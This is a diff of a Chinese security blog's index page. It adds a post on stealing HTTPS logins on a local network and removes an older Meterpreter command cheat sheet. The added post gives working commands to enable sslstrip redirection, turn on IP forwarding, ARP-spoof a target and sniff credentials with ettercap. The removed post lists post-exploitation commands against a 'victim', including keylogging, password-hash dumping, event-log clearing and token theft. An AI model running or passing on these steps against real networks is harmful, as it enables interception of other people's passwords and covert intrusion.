@@ -240,20 +240,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">96</span>
+          <span class="site-state-item-count">97</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-count">35</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">49</span>
+        <span class="site-state-item-count">50</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -308,6 +308,148 @@
       
 
       
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://directoree.github.io/post/HTTPS-password/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Catecat">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Catecat">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/post/HTTPS-password/" class="post-title-link" itemprop="url">内网称霸之《HTTPS账号密码获取》</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2018-11-22 01:17:04" itemprop="dateCreated datePublished" datetime="2018-11-22T01:17:04+08:00">2018-11-22</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2018-12-24 20:26:37" itemprop="dateModified" datetime="2018-12-24T20:26:37+08:00">2018-12-24</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kali-%E5%86%85%E7%BD%91%E7%A7%B0%E9%9C%B8/" itemprop="url" rel="index"><span itemprop="name">Kali-内网称霸</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/post/HTTPS-password/" class="post-meta-item leancloud_visitors" data-flag-title="内网称霸之《HTTPS账号密码获取》" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/post/HTTPS-password/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/post/HTTPS-password/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>⭐<strong>使用工具：arpspoof、ettercap、sslstrip</strong></p>
+<h4 id="一、将HTTPS转换成HTTP"><a href="#一、将HTTPS转换成HTTP" class="headerlink" title="一、将HTTPS转换成HTTP"></a>一、将HTTPS转换成HTTP</h4><table><tr><td bgcolor=#D1EEEE>在获取HTTPS账号、密码的操作前需要修改ettercap的设置，否则无法成功。
+1.先编辑/etc/ettercap/etter.conf下的文件内容，更改ettercap设置；
+1.1输入/etc/ettercap/etter.conf后找到：
+# if you use iptables:
+#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+这个地方
+2.改为（去掉两个#）：
+# if you use iptables:
+redir_command_on = "iptables <font color="red">-t</font> nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+redir_command_off = "iptables <font color="red">-t</font> nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+3.输入sslstrip -a -f -k 实现https转换成http以获取帐号密码；
+4.在该终端窗口下右键选择“复制SSH渠道(S)”；
+5.接着直接使用HTTP账号密码获取的方法就可以了。
+</td></tr></table>
+
+<blockquote>
+<blockquote>
+<p>vim使用方法：<br>编辑：按下i；<br>保存并退出：按下Esc，然后按Shift和：(冒号)，按下wq，完后按回车；<br>不保存并退出：按下Esc，然后按Shift和：(冒号)，按下q!，完后按回车；</p>
+</blockquote>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.conf</span><br><span class="line">i</span><br><span class="line">删除两个<span class="comment">#</span></span><br><span class="line">Esc、Shift ：、wq、回车</span><br><span class="line">sslstrip -a -f -k</span><br></pre></td></tr></table></figure>
+<h4 id="二、ARP欺骗和抓包获取HTTPS账号和密码"><a href="#二、ARP欺骗和抓包获取HTTPS账号和密码" class="headerlink" title="二、ARP欺骗和抓包获取HTTPS账号和密码"></a>二、ARP欺骗和抓包获取HTTPS账号和密码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof -i eth0 -t 目标IP 目标主机网关</span><br><span class="line">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure>
+<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
     
 
 
@@ -1765,166 +1907,6 @@ geolocate        -->利用谷歌地图定位（需要安装谷歌地图）</font
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://directoree.github.io/post/Metasploit2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="Catecat">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Catecat">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/post/Metasploit2/" class="post-title-link" itemprop="url">Metasploit工具Meterpreter的命令速查表</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2018-11-17 19:37:44" itemprop="dateCreated datePublished" datetime="2018-11-17T19:37:44+08:00">2018-11-17</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2018-12-24 20:29:39" itemprop="dateModified" datetime="2018-12-24T20:29:39+08:00">2018-12-24</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Metasploit/" itemprop="url" rel="index"><span itemprop="name">Metasploit</span></a>
-        </span>
-    </span>
-
-  
-    <span id="/post/Metasploit2/" class="post-meta-item leancloud_visitors" data-flag-title="Metasploit工具Meterpreter的命令速查表" title="阅读次数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span class="leancloud-visitors-count"></span>
-    </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/post/Metasploit2/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/post/Metasploit2/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>1.3k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>&nbsp;<br>&nbsp;</p>
-<h4 id="msfpayload反弹shell使用的一些命令集"><a href="#msfpayload反弹shell使用的一些命令集" class="headerlink" title="msfpayload反弹shell使用的一些命令集"></a><font face="楷体">msfpayload反弹shell使用的一些命令集</font></h4><p>&nbsp;</p>
-<h5 id="一、核心命令-–-帮助菜单"><a href="#一、核心命令-–-帮助菜单" class="headerlink" title="一、核心命令 – 帮助菜单"></a>一、核心命令 – 帮助菜单<font face="Arail"></h5><blockquote>
-<blockquote>
-<p><font color="#dd0000">background</font> – 将当前会话移动到背景变成一个session，当再次使用时再用sessions -i ID调用<br>bgkill – 杀死一个背景 meterpreter 脚本<br>bglist – 提供所有正在运行的后台脚本的列表<br>bgrun – 作为一个后台线程运行脚本<br>channel – 显示活动频道<br>close – 关闭通道<br>exit – 终止 meterpreter 会话<br>help – 帮助菜单<br>interact – 与通道进行交互<br>irb – 进入 Ruby 脚本模式<br><font color="#dd0000">migrate</font> – 移动到一个指定的 PID 的活动进程<br>quit – 终止 meterpreter 会话<br>read – 从通道读取数据<br><font color="#dd0000">run</font> – 执行以后它选定的 meterpreter 脚本<br>use – 加载 meterpreter 的扩展<br>write – 将数据写入到一个通道<br></font></p>
-</blockquote>
-</blockquote>
-<h4 id="二、文件系统命令"><a href="#二、文件系统命令" class="headerlink" title="二、文件系统命令"></a><font color="#dd0000">二、文件系统命令</font><font face="Arail"></h4><blockquote>
-<blockquote>
-<p>cat -读取并输出到标准输出文件的内容<br>cd -更改目录对受害人<br>del -删除文件对受害人<br>download-从受害者系统文件下载<br>edit-用 vim编辑文件<br>getlwd -打印本地目录<br>getwd -打印工作目录<br>lcd -更改本地目录<br>lpwd -打印本地目录<br>ls -列出在当前目录中的文件列表<br>mkdir -在受害者系统上的创建目录<br>pwd -输出工作目录<br>rm -删除文件<br>rmdir -受害者系统上删除目录<br>upload-从攻击者的系统往受害者系统上传文件<br></font></p>
-</blockquote>
-</blockquote>
-<h4 id="三、网络命令"><a href="#三、网络命令" class="headerlink" title="三、网络命令"></a>三、网络命令<font face="Arail"></h4><blockquote>
-<blockquote>
-<p>portfwd -端口转发<br>route -查看或修改受害者路由表<br></font></p>
-</blockquote>
-</blockquote>
-<h4 id="四、系统命令"><a href="#四、系统命令" class="headerlink" title="四、系统命令"></a>四、系统命令<font face="Arail"></h4><blockquote>
-<blockquote>
-<p>clearav -清除了受害者的计算机上的事件日志<br>drop_token -被盗的令牌<br>execute-执行命令<br>getpid -获取当前进程 ID (PID)<br>getprivs -尽可能获取尽可能多的特权<br>getuid -获取作为运行服务器的用户<br>kill -终止指定 PID 的进程<br><font color="#dd0000">ps</font> -列出正在运行的进程<br>reboot-重新启动受害人的计算机<br>reg -与受害人的注册表进行交互<br>rev2self -在受害者机器上调用 RevertToSelf()<br><font color="#dd0000">shell</font> -在受害者计算机上打开一个shell<br>shutdown-关闭了受害者的计算机<br>steal_token -试图窃取指定的 (PID) 进程的令牌<br>sysinfo -获取有关受害者计算机操作系统和名称等的详细信息<br></font></p>
-</blockquote>
-</blockquote>
-<h5 id="五、用户界面命令"><a href="#五、用户界面命令" class="headerlink" title="五、用户界面命令"></a>五、用户界面命令<font face="Arail"></h5><blockquote>
-<blockquote>
-<p>enumdesktops -列出所有可访问台式机<br>getdesktop -获取当前的 meterpreter 桌面<br>idletime -检查长时间以来，受害者系统空闲进程<br>keyscan_dump -键盘记录软件的内容转储<br>keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件<br>keyscan_stop -停止键盘记录软件<br>screenshot-抓去 meterpreter 桌面的屏幕截图<br>set_desktop -更改 meterpreter 桌面<br>uictl -启用用户界面组件的一些控件<br></font></p>
-</blockquote>
-</blockquote>
-<h4 id="六、特权升级命令"><a href="#六、特权升级命令" class="headerlink" title="六、特权升级命令"></a>六、特权升级命令<font face="Arail"></h4><blockquote>
-<blockquote>
-<p>getsystem -获得系统管理员权限<br></font></p>
-</blockquote>
-</blockquote>
-<h4 id="七、密码转储命令"><a href="#七、密码转储命令" class="headerlink" title="七、密码转储命令"></a>七、密码转储命令<font face="Arail"></h4><blockquote>
-<blockquote>
-<p>hashdump -抓去哈希密码 (SAM) 文件中的值<br></font></p>
-</blockquote>
-</blockquote>
-<h4 id="八、Timestomp-命令"><a href="#八、Timestomp-命令" class="headerlink" title="八、Timestomp 命令"></a>八、Timestomp 命令<font face="Arail"></h4><blockquote>
-<blockquote>
-<p>timestomp -操作修改，访问，并创建一个文件的属性<br></font></p>
-</blockquote>
-</blockquote>
-<p>&nbsp;<br>&nbsp;<br>&nbsp;</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
 
   
   <nav class="pagination">
@@ -1981,7 +1963,7 @@ geolocate        -->利用谷歌地图定位（需要安装谷歌地图）</font
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">660k</span>
+    <span title="站点总字数">662k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
